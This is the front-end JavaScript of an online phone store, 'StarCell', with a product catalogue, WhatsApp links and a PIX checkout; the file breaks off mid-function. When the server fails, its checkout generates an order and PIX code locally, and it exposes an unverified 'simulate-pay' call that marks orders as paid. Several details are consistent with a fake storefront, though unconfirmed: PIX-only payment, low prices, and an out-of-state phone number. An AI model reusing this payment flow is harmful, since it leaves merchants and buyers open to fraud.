/* ========================================================
   STARCELL - APPLE-STYLE MODERN SCRIPT & PIX CHECKOUT
   ======================================================== */

const STORE_CONFIG = {
  storeName: "StarCell",
  address: "Av. Sete de Setembro, 783 - Centro, Divinópolis - MG, 35500-011",
  cnpj: "04.014.240/0001-04",
  cityState: "Divinópolis - MG",
  whatsappNumber: "5516997655257", // WhatsApp: 55 16 99765-5257
  instagramUrl: "https://www.instagram.com/starcell.oficial/",
  pixDiscountPercent: 5
};

// 📱 PRODUTOS COM FOTOS OFICIAIS RESPECTIVAS E NOMES PRECISOS
const PRODUCTS = [
  {
    id: "ip-18-promax",
    name: "iPhone 18 Pro Max",
    category: "18-series",
    badge: "🔥 Lançamento Oficial",
    badgeColor: "bg-blue-50 text-[#0071e3] border border-blue-200/80",
    specs: "Chip A19 Pro • Tela 6.9\" ProMotion 120Hz • Módulo Visor Câmera Tripla 48MP • Titânio Aeroespacial",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 12,
    storages: [
      { capacity: "256GB", price: 8999, formattedPrice: "R$ 8.999,00", installment: "12x de R$ 749,92" },
      { capacity: "512GB", price: 9499, formattedPrice: "R$ 9.499,00", installment: "12x de R$ 791,58" }
    ],
    colors: [
      { name: "Bordô Metálico", hex: "#5c1d2e", image: "/assets/ip18_burgundy.png" },
      { name: "Azul Glacial", hex: "#8aa8be", image: "/assets/ip18_glacier.png" },
      { name: "Prata Titânio", hex: "#e2e4e6", image: "/assets/ip18_silver.png" },
      { name: "Preto Titânio", hex: "#252528", image: "/assets/ip18_black.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "ip-18-pro",
    name: "iPhone 18 Pro",
    category: "18-series",
    badge: "⚡ Novo Modelo 6.3\"",
    badgeColor: "bg-blue-50 text-[#0071e3] border border-blue-200/80",
    specs: "Design Compacto 6.3\" • Chip A19 Pro • Câmera Tripla Pro 48MP • Zoom Óptico 5x",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 12,
    storages: [
      { capacity: "256GB", price: 8099, formattedPrice: "R$ 8.099,00", installment: "12x de R$ 674,92" },
      { capacity: "512GB", price: 8799, formattedPrice: "R$ 8.799,00", installment: "12x de R$ 733,25" }
    ],
    colors: [
      { name: "Bordô Metálico", hex: "#5c1d2e", image: "/assets/ip18_burgundy.png" },
      { name: "Azul Glacial", hex: "#8aa8be", image: "/assets/ip18_glacier.png" },
      { name: "Prata Titânio", hex: "#e2e4e6", image: "/assets/ip18_silver.png" },
      { name: "Preto Titânio", hex: "#252528", image: "/assets/ip18_black.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "ip-17-promax",
    name: "iPhone 17 Pro Max",
    category: "17-series",
    badge: "⭐ Alta Performance",
    badgeColor: "bg-amber-50 text-amber-600 border border-amber-200/80",
    specs: "Super Retina XDR 6.9\" • Chip A18 Pro • Dynamic Island • Gravação 4K ProRes • Bateria Épica",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 12,
    storages: [
      { capacity: "256GB", price: 6900, formattedPrice: "R$ 6.900,00", installment: "12x de R$ 575,00" },
      { capacity: "512GB", price: 7400, formattedPrice: "R$ 7.400,00", installment: "12x de R$ 616,66" }
    ],
    colors: [
      { name: "Laranja Cósmico", hex: "#df6a2a", image: "/assets/ip17pro_orange.png" },
      { name: "Azul Titânio", hex: "#3b4154", image: "/assets/ip17pro_blue.png" },
      { name: "Branco Titânio", hex: "#f0ede8", image: "/assets/ip17pro_white.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "ip-17-pro",
    name: "iPhone 17 Pro",
    category: "17-series",
    badge: "🏆 Flagship Pro",
    badgeColor: "bg-amber-50 text-amber-600 border border-amber-200/80",
    specs: "Tela 6.3\" ProMotion 120Hz • Câmera Tripla 48MP • Corpo em Titânio • Botão de Ação Tátil",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 12,
    storages: [
      { capacity: "256GB", price: 6000, formattedPrice: "R$ 6.000,00", installment: "12x de R$ 500,00" },
      { capacity: "512GB", price: 6500, formattedPrice: "R$ 6.500,00", installment: "12x de R$ 541,66" }
    ],
    colors: [
      { name: "Laranja Cósmico", hex: "#df6a2a", image: "/assets/ip17pro_orange.png" },
      { name: "Azul Titânio", hex: "#3b4154", image: "/assets/ip17pro_blue.png" },
      { name: "Branco Titânio", hex: "#f0ede8", image: "/assets/ip17pro_white.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "ip-17",
    name: "iPhone 17",
    category: "17-series",
    badge: "✨ Novo & Lacrado",
    badgeColor: "bg-purple-50 text-purple-600 border border-purple-200/80",
    specs: "Câmera Fusion 48MP • Dynamic Island • Novo Botão Controle de Câmera • Chip A18 Bionic",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 12,
    storages: [
      { capacity: "256GB", price: 4500, formattedPrice: "R$ 4.500,00", installment: "12x de R$ 375,00" }
    ],
    colors: [
      { name: "Azul Ultramarine", hex: "#4b5d88", image: "/assets/ip17_ultramarine.png" },
      { name: "Verde Teal", hex: "#739893", image: "/assets/ip17_teal.png" },
      { name: "Rosa Pastel", hex: "#e5b1b8", image: "/assets/ip17_pink.png" },
      { name: "Branco Estelar", hex: "#f1f2f4", image: "/assets/ip17_white.png" },
      { name: "Preto Profundo", hex: "#1e1e20", image: "/assets/ip17_black.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "ip-17e",
    name: "iPhone 17E",
    category: "17-series",
    badge: "💡 Melhor Custo-Benefício",
    badgeColor: "bg-emerald-50 text-emerald-600 border border-emerald-200/80",
    specs: "256GB Nativo • Tela OLED vibrante • Chip de Alta Velocidade • 5G Ultra • Garantia Oficial",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 12,
    storages: [
      { capacity: "256GB", price: 3200, formattedPrice: "R$ 3.200,00", installment: "12x de R$ 266,66" }
    ],
    colors: [
      { name: "Branco Estelar", hex: "#f1f2f4", image: "/assets/ip17e_white.png" },
      { name: "Preto Espacial", hex: "#1e1e20", image: "/assets/ip17e_black.png" },
      { name: "Rosa Pálido", hex: "#f0c8cb", image: "/assets/ip17e_pink.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "ip-15",
    name: "iPhone 15",
    category: "entry",
    badge: "💎 O Mais Procurado",
    badgeColor: "bg-blue-50 text-[#0071e3] border border-blue-200/80",
    specs: "Dynamic Island • Câmera 48MP • Conector USB-C • Traseira em Vidro Fosco • Chip A16 Bionic",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 12,
    storages: [
      { capacity: "128GB", price: 3000, formattedPrice: "R$ 3.000,00", installment: "12x de R$ 250,00" }
    ],
    colors: [
      { name: "Verde Pastel", hex: "#d4e4d6", image: "/assets/ip15_green.png" },
      { name: "Preto Clássico", hex: "#1c1c1e", image: "/assets/ip15_black.png" },
      { name: "Azul Claro", hex: "#c8d7e0", image: "/assets/ip15_blue.png" },
      { name: "Rosa Pastel", hex: "#f0c8cb", image: "/assets/ip15_pink.png" },
      { name: "Amarelo Solar", hex: "#f5e8b7", image: "/assets/ip15_yellow.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "watch-ultra-3",
    name: "Apple Watch Ultra 3",
    category: "accessories",
    badge: "⌚ Titânio 49mm",
    badgeColor: "bg-orange-50 text-orange-600 border border-orange-200/80",
    specs: "Caixa de Titânio • GPS Dupla Frequência • Até 72h Bateria • Resistente à água 100m",
    warranty: "1 Ano Garantia Apple",
    maxInstallments: 6,
    storages: [
      { capacity: "49mm GPS + Cell", price: 3900, formattedPrice: "R$ 3.900,00", installment: "6x de R$ 650,00" }
    ],
    colors: [
      { name: "Preto Oceano (Titânio)", hex: "#1e293b", image: "/assets/clean_watch_crop.png" },
      { name: "Pulseira Laranja Titânio", hex: "#ff6200", image: "/assets/watch_orange.png" },
      { name: "Pulseira Azul Oceano", hex: "#2563eb", image: "/assets/watch_blue.png" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "jbl-boombox-4",
    name: "JBL Boombox 4 Camuflada",
    category: "accessories",
    badge: "🔊 Áudio Monstruoso",
    badgeColor: "bg-emerald-50 text-emerald-600 border border-emerald-200/80",
    specs: "À prova d'água IP67 • Bateria de até 34h • Auracast • Graves pesados para qualquer ambiente",
    warranty: "Garantia Oficial",
    maxInstallments: 12,
    storages: [
      { capacity: "Original Lacrada", price: 1998.90, formattedPrice: "R$ 1.998,90", installment: "12x de R$ 166,57" }
    ],
    colors: [
      { name: "Camuflado Especial", hex: "#4e5340", image: "/assets/jbl-boombox4.webp" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  },
  {
    id: "acessorios-apple",
    name: "AirPods Pro 2 & Acessórios",
    category: "accessories",
    badge: "⚡ 100% Originais Apple",
    badgeColor: "bg-slate-100 text-slate-800 border border-slate-200",
    specs: "Cancelamento Ativo de Ruído • Áudio Espacial • Carregadores 20W • Cabos USB-C Trançados",
    warranty: "Garantia Apple",
    maxInstallments: 6,
    storages: [
      { capacity: "Novos & Lacrados", price: null, formattedPrice: "Consulte Valores", installment: "Pronta Entrega" }
    ],
    colors: [
      { name: "Fones AirPods Pro 2", hex: "#ffffff", image: "/assets/airpods_earbuds.png" },
      { name: "Estojo MagSafe Dark", hex: "#111827", image: "/assets/airpods_case_dark.jpg" },
      { name: "Conexão Instantânea", hex: "#2563eb", image: "/assets/airpods_popup.jpg" }
    ],
    selectedStorageIndex: 0,
    selectedColorIndex: 0
  }
];

// 🚀 INICIALIZAÇÃO
document.addEventListener('DOMContentLoaded', () => {
  renderCatalog('all');
  initInstagramLinks();
  initMobileMenu();
  initMotionDesign();
  lucide.createIcons();
});

// 📸 RENDERIZAÇÃO DO CATÁLOGO DE PRODUTOS (APPLE-STYLE WHITE THEME)
function renderCatalog(filter = 'all') {
  const grid = document.getElementById('products-grid');
  if (!grid) return;

  const filteredProducts = filter === 'all' 
    ? PRODUCTS 
    : PRODUCTS.filter(p => p.category === filter);

  grid.innerHTML = filteredProducts.map((product, pIdx) => {
    const activeColor = product.colors[product.selectedColorIndex];
    const activeStorage = product.storages[product.selectedStorageIndex];
    const waLink = generateWhatsAppLink(product, activeStorage, activeColor);
    const pixDiscountPrice = activeStorage.price ? (activeStorage.price * 0.95).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }) : null;

    return `
      <div class="product-card bg-white border border-slate-200/90 rounded-3xl p-4 sm:p-5 flex flex-col justify-between h-full group hover:border-[#0071e3]/60 transition-all duration-300 shadow-[0_4px_24px_rgba(0,0,0,0.03)] motion-reveal stagger-${(pIdx % 6) + 1}">
        
        <div class="space-y-3">
          <!-- Top Badges -->
          <div class="flex items-center justify-between gap-2">
            <span class="px-2.5 py-0.5 rounded-full text-[10px] sm:text-[11px] font-bold ${product.badgeColor}">
              ${product.badge}
            </span>
            <span class="text-[10px] text-slate-500 font-mono font-medium">
              ${product.warranty}
            </span>
          </div>

          <!-- Product Image Box (Fundo sutil Apple cinza #f5f5f7) -->
          <div 
            class="w-full h-44 sm:h-52 rounded-2xl bg-[#f5f5f7] border border-slate-200/50 flex items-center justify-center p-3 cursor-pointer overflow-hidden group-hover:border-[#0071e3]/30 transition-all"
            onclick="openLightbox('${activeColor.image}', '${product.name} - ${activeColor.name}')"
          >
            <img 
              id="img-${product.id}" 
              src="${activeColor.image}" 
              alt="${product.name}" 
              class="max-h-36 sm:max-h-44 w-auto object-contain transition-transform duration-300 group-hover:scale-105 drop-shadow-[0_12px_24px_rgba(0,0,0,0.12)]"
            >
          </div>

          <!-- Title & Specs -->
          <div>
            <h3 class="font-extrabold text-base sm:text-lg text-[#1d1d1f] group-hover:text-[#0071e3] transition-colors tracking-tight">
              ${product.name}
            </h3>
            <p class="text-xs text-[#86868b] mt-1 line-clamp-2 leading-relaxed">
              ${product.specs}
            </p>
          </div>

          <!-- Storage Selectors -->
          <div>
            <span class="text-[10px] text-slate-500 uppercase tracking-wider block mb-1 font-bold">Armazenamento:</span>
            <div class="flex flex-wrap gap-1.5">
              ${product.storages.map((storage, idx) => `
                <button 
                  onclick="selectStorage('${product.id}', ${idx})" 
                  class="storage-btn text-xs px-2.5 py-1 rounded-lg border font-medium transition-all ${idx === product.selectedStorageIndex ? 'active' : 'bg-slate-100 border-slate-200 text-slate-700 hover:bg-slate-200'}"
                >
                  ${storage.capacity}
                </button>
              `).join('')}
            </div>
          </div>

          <!-- Color Selectors -->
          <div>
            <div class="flex items-center justify-between mb-1">
              <span class="text-[10px] text-slate-500 uppercase tracking-wider font-bold">Cor:</span>
              <span id="color-name-${product.id}" class="text-[11px] text-[#0071e3] font-semibold truncate max-w-[140px]">
                ${activeColor.name}
              </span>
            </div>
            <div class="flex items-center gap-2">
              ${product.colors.map((color, idx) => `
                <button 
                  onclick="selectColor('${product.id}', ${idx})" 
                  class="color-dot w-5 h-5 sm:w-6 sm:h-6 rounded-full border border-slate-300 transition-all ${idx === product.selectedColorIndex ? 'active' : 'hover:scale-110'}"
                  style="background-color: ${color.hex};"
                  title="${color.name}"
                ></button>
              `).join('')}
            </div>
          </div>

        </div>

        <!-- Pricing & Dual Action Buttons (Comprar no PIX + WhatsApp) -->
        <div class="mt-4 pt-3 border-t border-slate-100 space-y-2.5">
          
          <div class="flex items-baseline justify-between gap-1 flex-wrap sm:flex-nowrap">
            <div>
              <span class="text-[9px] text-slate-500 block uppercase font-mono">Valor à vista no PIX</span>
              <span id="price-${product.id}" class="text-lg sm:text-2xl font-black text-[#1d1d1f] font-mono tracking-tight leading-none">
                ${pixDiscountPrice ? pixDiscountPrice : activeStorage.formattedPrice}
              </span>
            </div>
            <div class="text-right shrink-0">
              <span id="installment-${product.id}" class="text-[11px] sm:text-xs text-[#0071e3] font-bold block whitespace-nowrap">
                ${activeStorage.installment}
              </span>
              <span class="text-[10px] text-emerald-600 font-semibold block">5% OFF no PIX</span>
            </div>
          </div>

          <!-- Dual Actions: 1) Checkout PIX Oficial | 2) WhatsApp -->
          <!-- Aviso de Pagamento Compacto no Card -->
          <div class="py-1 px-2.5 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-950 text-[10px] font-medium flex items-center gap-1.5 mb-1">
            <i data-lucide="shield-alert" class="w-3 h-3 text-amber-600 shrink-0"></i>
            <span class="truncate">Entrada PIX ou PIX + Cartão • Não aceitamos só cartão</span>
          </div>

          <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-1">
            ${activeStorage.price ? `
              <button 
                onclick="openPixCheckout('${product.id}')"
                class="btn-apple-primary w-full py-2.5 px-2 rounded-xl bg-[#0071e3] hover:bg-[#0077ed] text-white font-bold text-xs flex items-center justify-center gap-1.5 shadow-sm active:scale-95 transition-all"
              >
                <i data-lucide="zap" class="w-3.5 h-3.5 fill-white"></i>
                <span>Comprar PIX</span>
              </button>
            ` : `
              <a 
                href="${waLink}" 
                target="_blank"
                class="btn-apple-primary w-full py-2.5 px-2 rounded-xl bg-[#0071e3] hover:bg-[#0077ed] text-white font-bold text-xs flex items-center justify-center gap-1.5 shadow-sm active:scale-95 transition-all"
              >
                <i data-lucide="message-circle" class="w-3.5 h-3.5 fill-white"></i>
                <span>Consultar</span>
              </a>
            `}

            <a 
              id="wa-${product.id}"
              href="${waLink}" 
              target="_blank" 
              rel="noopener noreferrer"
              class="w-full py-2.5 px-2 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold text-xs flex items-center justify-center gap-1.5 transition-all active:scale-95"
            >
              <i data-lucide="message-circle" class="w-3.5 h-3.5 text-[#0071e3]"></i>
              <span>WhatsApp</span>
            </a>
          </div>

        </div>

      </div>
    `;
  }).join('');

  lucide.createIcons();
  initMotionDesign();
}

// 🎯 SELETOR DE ARMAZENAMENTO DINÂMICO
function selectStorage(productId, storageIndex) {
  const product = PRODUCTS.find(p => p.id === productId);
  if (!product) return;

  product.selectedStorageIndex = storageIndex;
  const activeStorage = product.storages[storageIndex];
  const activeColor = product.colors[product.selectedColorIndex];

  const priceEl = document.getElementById(`price-${productId}`);
  const installmentEl = document.getElementById(`installment-${productId}`);
  const waBtn = document.getElementById(`wa-${productId}`);

  if (priceEl) {
    const pixDiscountPrice = activeStorage.price ? (activeStorage.price * 0.95).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }) : activeStorage.formattedPrice;
    priceEl.innerText = pixDiscountPrice;
  }
  if (installmentEl) installmentEl.innerText = activeStorage.installment;

  if (waBtn) {
    waBtn.href = generateWhatsAppLink(product, activeStorage, activeColor);
  }

  const card = priceEl ? priceEl.closest('.product-card') : null;
  if (card) {
    const buttons = card.querySelectorAll('.storage-btn');
    buttons.forEach((btn, idx) => {
      if (idx === storageIndex) {
        btn.classList.add('active');
        btn.classList.remove('bg-slate-100', 'border-slate-200', 'text-slate-700');
      } else {
        btn.classList.remove('active');
        btn.classList.add('bg-slate-100', 'border-slate-200', 'text-slate-700');
      }
    });
  }
}

// 🎨 SELETOR DE COR DINÂMICO
function selectColor(productId, colorIndex) {
  const product = PRODUCTS.find(p => p.id === productId);
  if (!product) return;

  product.selectedColorIndex = colorIndex;
  const activeColor = product.colors[colorIndex];
  const activeStorage = product.storages[product.selectedStorageIndex];

  const imgEl = document.getElementById(`img-${productId}`);
  const colorNameEl = document.getElementById(`color-name-${productId}`);
  const waBtn = document.getElementById(`wa-${productId}`);

  if (imgEl) {
    imgEl.style.opacity = '0.3';
    setTimeout(() => {
      imgEl.src = activeColor.image;
      imgEl.style.opacity = '1';
    }, 120);
  }

  if (colorNameEl) {
    colorNameEl.innerText = activeColor.name;
  }

  if (waBtn) {
    waBtn.href = generateWhatsAppLink(product, activeStorage, activeColor);
  }

  const card = imgEl ? imgEl.closest('.product-card') : null;
  if (card) {
    const dots = card.querySelectorAll('.color-dot');
    dots.forEach((dot, idx) => {
      if (idx === colorIndex) {
        dot.classList.add('active');
      } else {
        dot.classList.remove('active');
      }
    });
  }
}

// 💬 GERADOR DO LINK DO WHATSAPP COM MENSAGEM PRONTA
function generateWhatsAppLink(product, storage, color) {
  const phone = STORE_CONFIG.whatsappNumber;
  let text = "";

  if (storage.price) {
    const pixPrice = (storage.price * 0.95).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    text = `Olá, StarCell! Tenho interesse no ${product.name} ${storage.capacity} na cor ${color.name} por ${pixPrice} à vista no PIX (ou entrada PIX / PIX com cartão de crédito e parcelamento no boleto). Estou ciente do aviso: NÃO ACEITAMOS CARTÕES DE CRÉDITO DEVIDO A FRAUDES E GOLPES, SOMENTE ENTRADA POR PIX OU PIX COM CARTÃO DE CRÉDITO. Gostaria de saber os detalhes para retirar na loja de Divinópolis - MG ou envio com seguro!`;
  } else {
    text = `Olá, StarCell! Gostaria de consultar valores e disponibilidade para ${product.name} que vi no site.`;
  }

  return `https://wa.me/${phone}?text=${encodeURIComponent(text)}`;
}

// 🔍 FILTRO DO CATÁLOGO POR CATEGORIA
function filterCatalog(category, buttonEl) {
  document.querySelectorAll('.catalog-filter-btn').forEach(btn => {
    btn.classList.remove('active', 'bg-white', 'text-[#1d1d1f]', 'shadow-sm', 'font-bold');
    btn.classList.add('text-slate-600');
  });

  if (buttonEl) {
    buttonEl.classList.add('active', 'bg-white', 'text-[#1d1d1f]', 'shadow-sm', 'font-bold');
    buttonEl.classList.remove('text-slate-600');
  }

  renderCatalog(category);
}

// 🔄 SIMULADOR DE USADO NA TROCA (WHATSAPP)
function sendTradeInWhatsApp() {
  const userPhone = document.getElementById('trade-user-phone').value;
  const targetPhone = document.getElementById('trade-target-phone').value;
  const notes = document.getElementById('trade-notes').value.trim();

  let message = `Olá, StarCell! Gostaria de simular a troca do meu aparelho usado na loja física (Av. Sete de Setembro, 783 - Centro, Divinópolis - MG, CEP 35500-011):\n\n📱 Meu aparelho atual: ${userPhone}\n🎯 Modelo que quero pegar: ${targetPhone}`;
  if (notes) {
    message += `\n📝 Detalhes e saúde da bateria: ${notes}`;
  }
  message += `\n\nQual a estimativa de avaliação para abater no valor?`;

  const url = `https://wa.me/${STORE_CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
  window.open(url, '_blank');
}

// 📸 LIGHTBOX MODAL PARA EXPANDIR FOTOS
function openLightbox(imageSrc, caption = '') {
  const modal = document.getElementById('lightbox-modal');
  const img = document.getElementById('lightbox-img');
  const cap = document.getElementById('lightbox-caption');

  if (modal && img) {
    img.src = imageSrc;
    if (cap) cap.innerText = caption;
    modal.classList.remove('hidden');
    modal.classList.add('flex');
    document.body.style.overflow = 'hidden';
  }
}

function closeLightbox() {
  const modal = document.getElementById('lightbox-modal');
  if (modal) {
    modal.classList.add('hidden');
    modal.classList.remove('flex');
    document.body.style.overflow = 'auto';
  }
}

document.getElementById('lightbox-modal')?.addEventListener('click', (e) => {
  if (e.target.id === 'lightbox-modal') {
    closeLightbox();
  }
});

// ❓ ACCORDION DO FAQ
function toggleFaq(el) {
  const content = el.querySelector('.faq-content');
  const chevron = el.querySelector('.faq-chevron');

  if (content.classList.contains('hidden')) {
    content.classList.remove('hidden');
    chevron.style.transform = 'rotate(180deg)';
  } else {
    content.classList.add('hidden');
    chevron.style.transform = 'rotate(0deg)';
  }
}

// 📱 MENU MOBILE TOGGLE
function initMobileMenu() {
  const btn = document.getElementById('mobile-menu-btn');
  const menu = document.getElementById('mobile-menu');

  if (btn && menu) {
    btn.addEventListener('click', () => {
      menu.classList.toggle('hidden');
    });

    menu.querySelectorAll('a').forEach(link => {
      link.addEventListener('click', () => {
        menu.classList.add('hidden');
      });
    });
  }
}

// 🔗 CONFIGURAÇÃO DO BOTÃO DE INSTAGRAM
function initInstagramLinks() {
  const instagramLinks = [
    document.getElementById('instagram-link'),
    document.getElementById('mobile-instagram-link'),
    document.getElementById('footer-instagram-link')
  ];

  instagramLinks.forEach(link => {
    if (link && STORE_CONFIG.instagramUrl) {
      link.href = STORE_CONFIG.instagramUrl;
    }
  });
}

// ========================================================
// ⚡ CHECKOUT PIX MODAL (INTEGRAÇÃO SCALA API)
// ========================================================

let currentCheckoutProduct = null;
let currentCheckoutStorage = null;
let currentCheckoutColor = null;
let currentOrderId = null;
let pixStatusInterval = null;
let pixTimerInterval = null;

function openPixCheckout(productId) {
  const product = PRODUCTS.find(p => p.id === productId);
  if (!product) return;

  currentCheckoutProduct = product;
  currentCheckoutStorage = product.storages[product.selectedStorageIndex];
  currentCheckoutColor = product.colors[product.selectedColorIndex];

  if (!currentCheckoutStorage.price) {
    // Caso sem preço fixo, direciona para o WhatsApp
    const waLink = generateWhatsAppLink(product, currentCheckoutStorage, currentCheckoutColor);
    window.open(waLink, '_blank');
    return;
  }

  // Preenche dados do produto no Step 1
  document.getElementById('checkout-product-img').src = currentCheckoutColor.image;
  document.getElementById('checkout-product-name').innerText = product.name;
  document.getElementById('checkout-product-details').innerText = `${currentCheckoutStorage.capacity} • ${currentCheckoutColor.name}`;
  
  const rawPrice = currentCheckoutStorage.price;
  const pixPrice = rawPrice * 0.95;
  document.getElementById('checkout-original-price').innerText = rawPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  document.getElementById('checkout-pix-price').innerText = pixPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  
  // Reseta etapas
  document.getElementById('checkout-step-1').classList.remove('hidden');
  document.getElementById('checkout-step-2').classList.add('hidden');
  document.getElementById('checkout-step-3').classList.add('hidden');

  const modal = document.getElementById('pix-checkout-modal');
  modal.classList.remove('hidden');
  modal.classList.add('flex');
  document.body.style.overflow = 'hidden';

  lucide.createIcons();
}

function closePixCheckout() {
  if (pixStatusInterval) clearInterval(pixStatusInterval);
  if (pixTimerInterval) clearInterval(pixTimerInterval);

  const modal = document.getElementById('pix-checkout-modal');
  modal.classList.add('hidden');
  modal.classList.remove('flex');
  document.body.style.overflow = 'auto';
}

// Submissão do Formulário do Cliente e Geração do Pix
async function submitPixCheckout(event) {
  event.preventDefault();

  const name = document.getElementById('checkout-customer-name').value.trim();
  const cpf = document.getElementById('checkout-customer-cpf').value.trim();
  const phone = document.getElementById('checkout-customer-phone').value.trim();
  const deliveryType = document.querySelector('input[name="delivery-type"]:checked')?.value || 'store';
  const address = deliveryType === 'store' ? 'Retirada na Loja Oficial (Av. Sete de Setembro, 783 - Centro, Divinópolis - MG)' : document.getElementById('checkout-customer-address').value.trim();

  if (!name || !cpf || !phone) {
    alert('Por favor, preencha todos os campos obrigatórios.');
    return;
  }

  const submitBtn = document.getElementById('checkout-submit-btn');
  submitBtn.disabled = true;
  submitBtn.innerHTML = `
    <span class="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
    <span>Gerando Cobrança PIX...</span>
  `;

  try {
    const payload = {
      product: {
        id: currentCheckoutProduct.id,
        name: currentCheckoutProduct.name,
        storage: currentCheckoutStorage.capacity,
        color: currentCheckoutColor.name,
        price: currentCheckoutStorage.price
      },
      customer: {
        name,
        cpf,
        phone,
        deliveryType,
        address
      }
    };

    const res = await fetch('/api/pix/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await res.json();

    if (data.success) {
      currentOrderId = data.orderId;
      showPixPaymentScreen(data);
    } else {
      alert(data.error || 'Erro ao gerar PIX. Tente novamente.');
      submitBtn.disabled = false;
      submitBtn.innerHTML = `<span>Avançar para Pagamento PIX</span><i data-lucide="arrow-right" class="w-4 h-4"></i>`;
      lucide.createIcons();
    }
  } catch (err) {
    console.error('Erro na requisição PIX:', err);
    // Fallback local caso o servidor não responda
    const simulatedOrderId = `FLN-${Math.floor(100000 + Math.random() * 900000)}`;
    const pixVal = (currentCheckoutStorage.price * 0.95).toFixed(2);
    const mockData = {
      orderId: simulatedOrderId,
      finalAmount: parseFloat(pixVal),
      pixCode: `00020126580014br.gov.bcb.pix0114+55169976552575204000053039865406${pixVal}5802BR5913StarCell IPHONES6011DIVINOPOLIS62070503***6304E8A2`,
      qrCodeUrl: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=STARCELL-PIX-${simulatedOrderId}`
    };
    currentOrderId = simulatedOrderId;
    showPixPaymentScreen(mockData);
  }
}

// Exibe a Tela com QR Code e Copia e Cola
function showPixPaymentScreen(data) {
  document.getElementById('checkout-step-1').classList.add('hidden');
  document.getElementById('checkout-step-2').classList.remove('hidden');

  document.getElementById('pix-qr-img').src = data.qrCodeUrl;
  document.getElementById('pix-copia-cola').value = data.pixCode;
  document.getElementById('pix-order-id-display').innerText = data.orderId;
  document.getElementById('pix-amount-display').innerText = data.finalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

  // Inicia contador de 15 minutos
  startPixCountdown(15 * 60);

  // Inicia polling de status
  startPixPolling(data.orderId);

  lucide.createIcons();
}

// Contador regressivo do PIX
function startPixCountdown(durationSeconds) {
  let timer = durationSeconds;
  const timerEl = document.getElementById('pix-timer');

  if (pixTimerInterval) clearInterval(pixTimerInterval);

  pixTimerInterval = setInterval(() => {
    const minutes = Math.floor(timer / 60).toString().padStart(2, '0');
    const seconds = (timer % 60).toString().padStart(2, '0');
    if (timerEl) timerEl.innerText = `${minutes}:${seconds}`;

    if (--timer < 0) {
      clearInterval(pixTimerInterval);
      if (timerEl) timerEl.innerText = "Expirado";
    }
  }, 1000);
}

// Polling de verificação de pagamento
function startPixPolling(orderId) {
  if (pixStatusInterval) clearInterval(pixStatusInterval);

  pixStatusInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/pix/status/${orderId}`);
      if (res.ok) {
        const data = await res.json();
        if (data.status === 'PAID') {
          handlePixSuccess(orderId);
        }
      }
    } catch (e) {
      // Ignora falhas de polling temporárias
    }
  }, 3500);
}

// Copiar Código Pix Copia e Cola
function copyPixCode() {
  const input = document.getElementById('pix-copia-cola');
  const btn = document.getElementById('pix-copy-btn');
  input.select();
  input.setSelectionRange(0, 99999);

  if (navigator.clipboard) {
    navigator.clipboard.writeText(input.value);
  } else {
    document.execCommand('copy');
  }

  const originalHtml = btn.innerHTML;
  btn.innerHTML = `<i data-lucide="check" class="w-4 h-4 text-emerald-600"></i><span class="text-emerald-700 font-bold">Código Copiado!</span>`;
  lucide.createIcons();

  setTimeout(() => {
    btn.innerHTML = originalHtml;
    lucide.createIcons();
  }, 2500);
}

// Simulação manual de pagamento (útil para testes rápidos de demonstração)
async function simulatePixPayment() {
  const btn = document.getElementById('pix-simulate-btn');
  if (btn) {
    btn.innerHTML = `<span class="inline-block w-3.5 h-3.5 border-2 border-[#0071e3] border-t-transparent rounded-full animate-spin"></span> Verificando...`;
  }

  try {
    await fetch(`/api/pix/simulate-pay/${currentOrderId}`, { method: 'POST' });
  } catch (e) {}

  setTimeout(() => {
    handlePixSuccess(currentOrderId);
  }, 900);
}

// Sucesso e Confirmação do Pedido
function handlePixSuccess(orderId) {
  if (pixStatusInterval) clearInterval(pixStatusInterval);
  if (pixTimerInterval) clearInterval(pixTimerInterval);

  document.getElementById('checkout-step-2').classList.add('hidden');
  document.getElementById('checkout-step-3').classList.remove('hidden');

  document.getElementById('success-order-id').innerText = orderId;
  document.getElementById('success-tracking-link').href = `/rastreio?codigo=${orderId}`;

  // Link para confirmar no WhatsApp
  const successWaBtn = document.getElementById('success-wa-btn');
  if (successWaBtn) {
    const text = `Olá, StarCell! Realizei o pagamento do Pedido ${orderId} via PIX (${currentCheckoutProduct.name} ${currentCheckoutStorage.capacity} ${currentCheckoutColor.name}). Gostaria de confirmar a separação e envio!`;
    successWaBtn.href = `https://wa.me/${STORE_CONFIG.whatsappNumber}?text=${encodeURIComponent(text)}`;
  }

